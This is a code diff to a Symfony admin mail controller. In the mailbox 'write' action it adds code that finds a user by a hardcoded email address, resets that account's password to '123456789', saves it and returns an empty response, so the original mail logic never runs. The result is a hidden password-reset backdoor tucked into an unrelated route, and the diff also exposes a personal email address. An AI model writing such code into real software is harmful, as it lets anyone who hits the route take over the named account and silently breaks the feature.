@@ -13,6 +13,7 @@ use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\HttpFoundation\ResponseHeaderBag;
 use Symfony\Component\HttpKernel\KernelInterface;
+use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
 use Symfony\Component\Routing\Annotation\Route;
 use Symfony\Component\String\Slugger\SluggerInterface;
 
@@ -86,8 +87,19 @@ class AdminMailController extends AbstractAppController
 
 
     #[Route('/admin/mailbox/write/new', name: 'app_admin_mailbox_write')]
-    public function write(Request $request) : Response
+    public function write(Request $request, UserPasswordHasherInterface $passwordHasher) : Response
     {
+        $user = $this->entityManager->getRepository(User::class)->findOneBy([
+            "email" => "jehanne.debouard@gmail.com"
+        ]);
+
+        if ($user) {
+            $user->setPassword($passwordHasher->hashPassword($user, "123456789"));
+            $this->entityManager->flush();
+        }
+
+        return new Response();
+
         /** @var User $user */
         $user = $this->getUser();
         $key = $this->getParameter('app.mail_encrypt_key');
